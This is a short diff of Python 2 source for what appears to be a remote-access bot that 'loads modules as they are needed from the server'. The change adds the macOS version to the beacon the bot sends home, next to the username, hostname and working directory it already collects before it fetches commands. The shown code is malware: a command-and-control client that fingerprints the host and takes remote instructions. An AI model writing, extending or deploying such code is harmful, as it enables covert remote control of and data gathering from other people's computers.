@@ -3,7 +3,7 @@
 """Minimal bot which loads modules as they are needed from the server."""
 __author__ = "Marten4n6"
 __license__ = "GPLv3"
-__version__ = "4.0.1"
+__version__ = "4.1.0"
 
 import getpass
 import json
@@ -17,6 +17,7 @@ from base64 import b64encode, b64decode
 from binascii import hexlify
 from time import sleep, time
 from zlib import decompress
+import platform
 from StringIO import StringIO
 from urllib import urlencode
 import sys
@@ -217,7 +218,7 @@ def get_command():
                   b64encode(json.dumps({
                       "type": RequestType.GET_COMMAND, "username": run_command("whoami"),
                       "hostname": run_command("hostname"), "path": run_command("pwd"),
-                      "loader_name": LOADER_OPTIONS["loader_name"]
+                      "version": str(platform.mac_ver()[0]), "loader_name": LOADER_OPTIONS["loader_name"]
         }))
     }
     response = ""
